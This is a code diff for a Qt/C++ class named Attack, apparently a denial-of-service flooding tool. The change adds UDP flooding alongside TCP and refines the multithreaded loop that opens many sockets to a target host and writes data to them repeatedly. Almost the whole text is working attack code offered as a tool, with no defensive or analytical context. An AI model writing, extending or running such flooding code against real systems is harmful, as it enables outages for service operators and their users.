@@ -16,36 +16,50 @@ Attack::~Attack()
     delete ui;
 }
 
-QTcpSocket *Attack::make_socket(QString host, QString port) {
+QAbstractSocket *Attack::make_socket(QString host, QString port) {
     if(!running){
-        return 0;
+        return nullptr;
     }
-    QTcpSocket *sock = new QTcpSocket();
-    sock->connectToHost(host, port.toInt(), QTcpSocket::WriteOnly);
+    QAbstractSocket *sock;
+    switch (protocol) {
+    case TCP:{
+        sock = new QTcpSocket(this);
+        sock->connectToHost(host, port.toInt(), QTcpSocket::WriteOnly);
+        break;
+    }
+    case UDP:{
+        sock = new QUdpSocket(this);
+        sock->connectToHost(host, port.toInt(), QUdpSocket::WriteOnly);
+        break;
+    }
+
+    default:
+        break;
+    }
     if(sock->waitForConnected()){
         return sock;
     }else{
-        return 0;
+        return nullptr;
     }
 }
 
 void Attack::dos() {
-    QTcpSocket *sockets[connections];
+    QAbstractSocket *sockets[connections];
     int x;
     for(x=0; x!= connections; x++){
-        sockets[x]=0;
+        sockets[x] = nullptr;
     }
 
-    while(running) {
+    while(true) {
         for(x=0; running && x != connections; x++) {
-            if(sockets[x] == 0){
+            if(sockets[x] == nullptr){
                 sockets[x] = make_socket(target, port);
                 continue;
             }
             sockets[x]->write("\0");
             if(sockets[x]->waitForBytesWritten()) {
                 sockets[x]->disconnect();
-                if(sockets[x]->waitForDisconnected()){
+                if(sockets[x]->waitForDisconnected(5)){
                     sockets[x]->close();
                     sockets[x] = make_socket(target, port);
                 }
@@ -53,13 +67,18 @@ void Attack::dos() {
             voly++;
         }
         voly++;
-        QThread::usleep(20);
+        if(!running){
+            break;
+        }else{
+            QThread::usleep(20);
+        }
     }
     for(int i = 0; i < connections; i++){
-        if(sockets[i] != 0){
+        if(sockets[i] != nullptr){
             sockets[i]->disconnect();
-            if(sockets[i]->waitForDisconnected(10)){
+            if(sockets[i]->waitForDisconnected(5)){
                 sockets[i]->close();
+                delete sockets[i];
             }
         }
     }
@@ -68,7 +87,7 @@ void Attack::dos() {
 
 void Attack::start(){
     for(int x = 0; running && x != threads; x++) {
-        auto trd = QtConcurrent::run(this, &Attack::dos);
+        auto trd = QtConcurrent::run([=]{dos();});
         thread_list.append(trd);
     }
 }
@@ -107,11 +126,7 @@ void Attack::update_gui(){
 
 void Attack::showEvent(QShowEvent *event){
     QWidget::showEvent(event);
-    QtConcurrent::run([=]{
-        start();
-    });
-    QtConcurrent::run([=]{
-        update_gui();
-    });
+    QtConcurrent::run([=]{start();});
+    QtConcurrent::run([=]{update_gui();});
     return;
 }
